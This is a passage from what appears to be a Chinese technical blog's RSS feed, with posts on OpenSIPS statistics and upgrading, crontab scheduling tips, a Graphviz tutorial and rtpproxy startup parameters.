0&lt;!-- raw HTML omitted --&gt;core:timestamp:: 179429&lt;!-- raw HTML omitted --&gt;net:waiting_udp:: 0&lt;!-- raw HTML omitted --&gt;net:waiting_tcp:: 0&lt;!-- raw HTML omitted --&gt;sl:1xx_replies:: 0&lt;!-- raw HTML omitted --&gt;sl:2xx_replies:: 930643&lt;!-- raw HTML omitted --&gt;sl:3xx_replies:: 0&lt;!-- raw HTML omitted --&gt;sl:4xx_replies:: 265459&lt;!-- raw HTML omitted --&gt;sl:5xx_replies:: 168472&lt;!-- raw HTML omitted --&gt;sl:6xx_replies:: 0&lt;!-- raw HTML omitted --&gt;sl:sent_replies:: 1364574&lt;!-- raw HTML omitted --&gt;sl:sent_err_replies:: 0&lt;!-- raw HTML omitted --&gt;sl:received_ACKs:: 27&lt;!-- raw HTML omitted --&gt;tm:received_replies:: 570374&lt;!-- raw HTML omitted --&gt;tm:relayed_replies:: 402332&lt;!-- raw HTML omitted --&gt;tm:local_replies:: 155868&lt;!-- raw HTML omitted --&gt;tm:UAS_transactions:: 181106&lt;!-- raw HTML omitted --&gt;tm:UAC_transactions:: 71770&lt;!-- raw HTML omitted --&gt;tm:2xx_transactions:: 117167&lt;!-- raw HTML omitted --&gt;tm:3xx_transactions:: 0&lt;!-- raw HTML omitted --&gt;tm:4xx_transactions:: 138052&lt;!-- raw HTML omitted --&gt;tm:5xx_transactions:: 29&lt;!-- raw HTML omitted --&gt;tm:6xx_transactions:: 0&lt;!-- raw HTML omitted --&gt;&lt;strong&gt;tm:inuse_transactions:: 2&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt;uri:positive checks:: 195024&lt;!-- raw HTML omitted --&gt;uri:negative_checks:: 0&lt;!-- raw HTML omitted --&gt;usrloc:registered_users:: 0&lt;!-- raw HTML omitted --&gt;usrloc:location-users:: 0&lt;!-- raw HTML omitted --&gt;usrloc:location-contacts:: 0&lt;!-- raw HTML omitted --&gt;usrloc:location-expires:: 0&lt;!-- raw HTML omitted --&gt;registrar:max_expires:: 180&lt;!-- raw HTML omitted --&gt;registrar:max_contacts:: 1&lt;!-- raw HTML omitted --&gt;registrar:default_expire:: 150&lt;!-- raw HTML omitted --&gt;&lt;strong&gt;registrar:accepted_regs:: 110781&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt;&lt;strong&gt;registrar:rejected_regs:: 84236&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt;&lt;strong&gt;dialog:active_dialogs:: 0&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt;dialog:early_dialogs:: 0&lt;!-- raw HTML omitted --&gt;dialog:processed_dialogs:: 150397&lt;!-- raw HTML omitted --&gt;dialog:expired_dialogs:: 0&lt;!-- raw HTML omitted --&gt;&lt;strong&gt;dialog:failed_dialogs:: 137297&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt;dialog:create_sent:: 0&lt;!-- raw HTML omitted --&gt;dialog:update_sent:: 0&lt;!-- raw HTML omitted --&gt;dialog:delete_sent:: 0&lt;!-- raw HTML omitted --&gt;dialog:create_recv:: 0&lt;!-- raw HTML omitted --&gt;dialog:update_recv:: 0&lt;!-- raw HTML omitted --&gt;dialog:delete_recv:: 0&lt;/p&gt;</description>
    </item>
    <item>
      <title>opensips centos7 安装与升级</title>
      <link>https://wdd.js.org/opensips/ch3/centos7-2.4/</link>
      <pubDate>Tue, 02 Jul 2019 19:42:05 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch3/centos7-2.4/</guid>
      <description>&lt;h1 id=&#34;环境声明&#34;&gt;环境声明&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;系统 centos7&lt;/li&gt;
&lt;li&gt;已经安装opensips 2.2&lt;/li&gt;
&lt;li&gt;需要升级目标 opensips 2.4.6&lt;/li&gt;
&lt;li&gt;要求：当前系统上没有部署mysql服务端程序&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;升级步骤&#34;&gt;升级步骤&lt;/h1&gt;
&lt;p&gt;升级分为两步&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;opensips 应用升级，包括源码的下载，编译等等&lt;/li&gt;
&lt;li&gt;opensips 数据库升级，使用opensipsdbctl工具迁移老的数据&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;edge-opensips应用升级&#34;&gt;Edge: opensips应用升级&lt;/h2&gt;
&lt;p&gt;升级过程以Makefile交付，可以先新建一个空的目录，如 /root/opensips-update/&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# file: /root/opensips-update/Makefile&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;VERSION&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;2.4.6
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;download:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	wget https://opensips.org/pub/opensips/&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;VERSION&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;/opensips-&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;VERSION&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;.tar.gz;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  tar -zxvf opensips-&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;VERSION&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;.tar.gz;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;build:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cd opensips-&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;VERSION&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  make all -j4 include_modules&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mysql httpd db_http siprec&amp;#34;&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;# siprec是可选的&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  make install include_modules&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mysql httpd db_http siprec&amp;#34;&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;# siprec是可选的&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;新建空目录/root/opensips-update/&lt;/li&gt;
&lt;li&gt;在新目录中创建名为 Makefile的文件, 内容如上面所示&lt;/li&gt;
&lt;li&gt;执行 make download&lt;/li&gt;
&lt;li&gt;执行 make build&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;core-opensips应用升级&#34;&gt;Core: opensips应用升级&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;make all -j4 include_modules&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mysql httpd&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;make install include_modules&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mysql httpd&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;可能遇到的报错以及解决方案&#34;&gt;可能遇到的报错以及解决方案&lt;/h1&gt;
&lt;p&gt;主要的问题可能是某些包冲突，或者某些库没有安装依赖。在解决问题后，需要重新编译。&lt;/p&gt;</description>
    </item>
    <item>
      <title>长太息以掩涕兮，哀crontab之难用</title>
      <link>https://wdd.js.org/shell/crontab-tips/</link>
      <pubDate>Mon, 01 Jul 2019 18:59:57 +0800</pubDate>
      <guid>https://wdd.js.org/shell/crontab-tips/</guid>
      <description>&lt;p&gt;我已经在 crontab 上栽了很多次跟头了，我决定写个总结。&lt;/p&gt;
&lt;h1 id=&#34;常用的命令&#34;&gt;常用的命令&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;crontab -l &lt;span style=&#34;color:#75715e&#34;&gt;# 显示计划任务脚本&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;crontab -e &lt;span style=&#34;color:#75715e&#34;&gt;# 编辑计划任务&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;计划任务的格式&#34;&gt;计划任务的格式&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/shell/crontab-tips/2022-10-29-14-37-43.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;时间格式&#34;&gt;时间格式&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* &lt;span style=&#34;color:#75715e&#34;&gt;# 每个最小单元&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/ &lt;span style=&#34;color:#75715e&#34;&gt;# 时间步长，每隔多长时间执行 */10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;- &lt;span style=&#34;color:#75715e&#34;&gt;# 区间，如 4-9&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;# 散列，如 4,9,10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;几个例子&#34;&gt;几个例子&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;crontab 最小支持的时间单位是 1 分钟，不支持每个多少秒执行一次&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 每分钟执行&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* * * * * cmd
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 每小时的15，45分钟执行&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;15,45 * * * * cmd
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 每个周一到周五，早上9点到下午6点之间，每隔15分钟喝一次水&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;*/15 9,18 * * 1-5 喝水
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;每个-x-秒执行&#34;&gt;每个 X 秒执行&lt;/h1&gt;
&lt;p&gt;crontab 的默认最小执行周期是 1 分钟，如果想每隔多少秒执行一次，就需要一些特殊的手段。&lt;/p&gt;
&lt;h2 id=&#34;每隔-5-秒&#34;&gt;每隔 5 秒&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* * * * * &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i in &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;1..12&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; /bin/cmd -arg1 ; sleep 5; &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;heading&#34;&gt;&lt;/h2&gt;
&lt;h2 id=&#34;每隔-15-秒&#34;&gt;每隔 15 秒&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* * * * * /bin/cmd -arg1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* * * * * sleep 15; /bin/cmd -arg1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* * * * * sleep 30; /bin/cmd -arg1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* * * * * sleep 45; /bin/cmd -arg1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;heading-1&#34;&gt;&lt;/h1&gt;
&lt;h1 id=&#34;为什么-crontab-指定的脚本没有执行&#34;&gt;为什么 crontab 指定的脚本没有执行？&lt;/h1&gt;
&lt;p&gt;有以下可能原因&lt;/p&gt;</description>
    </item>
    <item>
      <title>Graphviz教程 你学废了吗？</title>
      <link>https://wdd.js.org/posts/2019/06/</link>
      <pubDate>Thu, 27 Jun 2019 08:59:47 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/06/</guid>
      <description>&lt;p&gt;语雀官方的Graphviz感觉太复杂，我还是写一个简单一点的吧。&lt;/p&gt;
&lt;h1 id=&#34;两个圆一条线&#34;&gt;两个圆一条线&lt;/h1&gt;
&lt;p&gt;注意&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;graph&lt;/strong&gt;是用来标记无向图，里面只能用&amp;ndash;，不能用-&amp;gt;，否则无法显然出图片&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;digraph&lt;/strong&gt;用来标记有向图，里面只用用-&amp;gt; 不能用&amp;ndash;, 否则无法显然出图片&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;graph easy &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  a -- b;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/06/2022-10-29-20-07-29.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;连线加个备注&#34;&gt;连线加个备注&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;graph easy&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  a--b &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;label&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;你真漂亮&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/06/2022-10-29-20-07-38.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;你真漂亮要大点红色显眼点&#34;&gt;你真漂亮，要大点，红色显眼点&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;graph easy&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  a--b &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;label&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;你真漂亮&amp;#34;&lt;/span&gt;, fontcolor&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;red, fontsize&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;34&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/06/2022-10-29-20-07-47.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;两个圆一个带有箭头的线&#34;&gt;两个圆，一个带有箭头的线&lt;/h1&gt;
&lt;p&gt;注意，这里用的&lt;strong&gt;digraph， 用来表示有向图&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;digraph easy &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  a -&amp;gt; b;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/06/2022-10-29-20-07-55.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;如何画虚线呢&#34;&gt;如何画虚线呢？&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;digraph easy &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  a -&amp;gt; b &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;style&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;dashed&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/06/2022-10-29-20-08-03.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;椭圆太单调了有没有其他形状&#34;&gt;椭圆太单调了，有没有其他形状？&lt;/h1&gt;
&lt;p&gt;shape&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;box  矩形&lt;/li&gt;
&lt;li&gt;polygon&lt;/li&gt;
&lt;li&gt;ellipse&lt;/li&gt;
&lt;li&gt;circle  圆形&lt;/li&gt;
&lt;li&gt;point&lt;/li&gt;
&lt;li&gt;egg 蛋形&lt;/li&gt;
&lt;li&gt;triangle 三角形&lt;/li&gt;
&lt;li&gt;plaintext 使用文字&lt;/li&gt;
&lt;li&gt;diamond 钻石型&lt;/li&gt;
&lt;li&gt;trapezium 梯形&lt;/li&gt;
&lt;li&gt;parallelogram 斜的长方形&lt;/li&gt;
&lt;li&gt;house&lt;/li&gt;
&lt;li&gt;hexagon&lt;/li&gt;
&lt;li&gt;octagon&lt;/li&gt;
&lt;li&gt;doublecircle&lt;/li&gt;
&lt;li&gt;doubleoctagon&lt;/li&gt;
&lt;li&gt;tripleoctagon&lt;/li&gt;
&lt;li&gt;invtriangle&lt;/li&gt;
&lt;li&gt;invtrapezium&lt;/li&gt;
&lt;li&gt;invhouse&lt;/li&gt;
&lt;li&gt;Mdiamond&lt;/li&gt;
&lt;li&gt;Msquare&lt;/li&gt;
&lt;li&gt;Mcircle&lt;/li&gt;
&lt;li&gt;none&lt;/li&gt;
&lt;li&gt;record&lt;/li&gt;
&lt;li&gt;Mrecord&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/06/2022-10-29-20-08-11.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>rtpproxy学习</title>
      <link>https://wdd.js.org/opensips/ch9/rtpproxy/</link>
      <pubDate>Thu, 20 Jun 2019 21:24:10 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch9/rtpproxy/</guid>
      <description>&lt;h1 id=&#34;rtppoxy能提供什么功能&#34;&gt;rtppoxy能提供什么功能？&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;VoIP NAT穿透&lt;/li&gt;
&lt;li&gt;传输声音、视频等任何RTP流&lt;/li&gt;
&lt;li&gt;播放预先设置的呼入放音&lt;/li&gt;
&lt;li&gt;RTP包重新分片&lt;/li&gt;
&lt;li&gt;包传输优化&lt;/li&gt;
&lt;li&gt;VoIP VPN 穿透&lt;/li&gt;
&lt;li&gt;实时流复制&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;rtpproxy一般和那些软件集成&#34;&gt;rtpproxy一般和那些软件集成？&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;opensips&lt;/li&gt;
&lt;li&gt;Kamailio&lt;/li&gt;
&lt;li&gt;Sippy B2BUA&lt;/li&gt;
&lt;li&gt;freeswitch&lt;/li&gt;
&lt;li&gt;reSIProcate B2BUA&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;rtpporxy的工作原理&#34;&gt;rtpporxy的工作原理&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch9/rtpproxy/2022-12-02-16-53-29.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;启动参数介绍&#34;&gt;启动参数介绍&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;参数&lt;/th&gt;
          &lt;th&gt;功能说明&lt;/th&gt;
          &lt;th&gt;例子&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;-l&lt;/td&gt;
          &lt;td&gt;ipv4监听的地址&lt;/td&gt;
          &lt;td&gt;-l 192.168.3.47&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;-6&lt;/td&gt;
          &lt;td&gt;ipv6监听的地址&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;-s&lt;/td&gt;
          &lt;td&gt;控制Socket, 通过这个socket来修改，创建或者删除rtp session&lt;/td&gt;
          &lt;td&gt;-s udp:192.168.3.49:6890&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;-F&lt;/td&gt;
          &lt;td&gt;默认情况下，rtpproxy会警告用户以超级用户的身份运行rtpproxy并且不允许远程控制。使用-F可以关闭这个限制&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;-m&lt;/td&gt;
          &lt;td&gt;最小使用的端口号，默认35000&lt;/td&gt;
          &lt;td&gt;-m 20000&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;-M&lt;/td&gt;
          &lt;td&gt;最大使用的端口号，默认65000&lt;/td&gt;
          &lt;td&gt;-M 50000&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;-L&lt;/td&gt;
          &lt;td&gt;单个进程最多可以使用的文件描述符。rtpproxy要求每个session使用4个文件描述符。&lt;/td&gt;
          &lt;td&gt;-L 20000&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;-d&lt;/td&gt;
          &lt;td&gt;日志级别，可选DBUG, INFO, WARN, ERR and CRIT, 默认DBUG&lt;/td&gt;
          &lt;td&gt;-d ERR&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;-A&lt;/td&gt;
          &lt;td&gt;广播地址，用于rtpprxy在NAT防火墙内部时使用&lt;/td&gt;
          &lt;td&gt;-A 171.16.200.13&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;-f&lt;/td&gt;
          &lt;td&gt;让rtpproxy前台运行，在做rtpproxy容器化时，启动脚本必须带有-f，否则容器运行后会立即退出&lt;/td&gt;
